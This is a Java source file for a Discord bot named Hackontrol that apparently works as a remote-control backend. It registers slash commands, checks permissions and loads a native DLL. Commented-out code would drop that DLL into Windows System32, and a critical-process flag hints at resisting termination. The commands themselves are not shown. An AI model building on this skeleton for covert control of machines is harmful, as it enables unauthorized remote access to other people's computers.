package com.khopan.hackontrol;

import java.lang.annotation.Native;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;

import com.khopan.hackontrol.command.CommandManager;
import com.khopan.hackontrol.permission.Permission;
import com.khopan.hackontrol.permission.PermissionManager;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.commands.Command;
import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	private static Hackontrol INSTANCE;

	@Native
	private static final boolean CRITICAL_PROCESS = false;

	private final JDA bot;
	private final Guild guild;
	private final Map<Command, com.khopan.hackontrol.command.Command> map;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		this.map = new LinkedHashMap<>();
		this.bot = JDABuilder.createDefault(Token.BOT_TOKEN)
				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
				.addEventListeners(new Listener())
				.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			System.exit(0);
			this.guild = null;
			return;
		}

		this.guild = this.bot.getGuildById(1181833410235351171L);
		CommandManager.register(this :: register);
	}

	private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
		if(commandClass == null) {
			return;
		}

		com.khopan.hackontrol.command.Command command;

		try {
			command = commandClass.getConstructor().newInstance();
		} catch(Throwable Errors) {
			return;
		}

		SlashCommandData data = command.getCommand();
		Command botCommand;

		try {
			botCommand = this.bot.upsertCommand(data).complete();
		} catch(Throwable Errors) {
			return;
		}

		this.map.put(botCommand, command);
	}

	private void onSlashCommand(SlashCommandInteractionEvent Event) {
		long identifier = Event.getCommandIdLong();
		Iterator<Entry<Command, com.khopan.hackontrol.command.Command>> iterator = this.map.entrySet().iterator();

		while(iterator.hasNext()) {
			Entry<Command, com.khopan.hackontrol.command.Command> entry = iterator.next();
			Command key = entry.getKey();
			com.khopan.hackontrol.command.Command value = entry.getValue();

			if(key.getIdLong() != identifier) {
				continue;
			}

			Permission permission = value.getPermissionLevel();
			User user = Event.getUser();

			if(PermissionManager.checkPermission(user, permission)) {
				new Thread(() -> value.handleCommand(Event)).start();
				return;
			}

			Event.reply("`You don't have permission to use this command\nThis command required at least " + permission.getName() + "`")
			.queue();
			return;
		}
	}

	public JDA getBot() {
		return this.bot;
	}

	public Guild getGuild() {
		return this.guild;
	}

	public static void main(String[] args) throws Throwable {
		/*String windowsDirectoryPath = System.getenv("windir");

		if(windowsDirectoryPath == null) {
			System.exit(1);
			return;
		}

		File windowsDirectory = new File(windowsDirectoryPath);

		if(!windowsDirectory.exists()) {
			System.exit(1);
			return;
		}

		File system32Directory = new File(windowsDirectory, "System32");

		if(!system32Directory.exists()) {
			System.exit(1);
			return;
		}

		File win32Library = new File(system32Directory, "win32c.dll");
		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
		InputStream stream = Hackontrol.class.getResourceAsStream("Hackontrol.dll");
		byte[] data = stream.readAllBytes();
		stream.close();

		try {
			FileOutputStream output = new FileOutputStream(libraryFile);
			output.write(data);
			output.close();
		} catch(Throwable Errors) {

		}

		System.load(libraryFile.getAbsolutePath());*/
		System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
		Hackontrol.getInstance();
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}

	private class Listener extends ListenerAdapter {
		@Override
		public void onSlashCommandInteraction(SlashCommandInteractionEvent Event) {
			Hackontrol.this.onSlashCommand(Event);
		}
	}
}
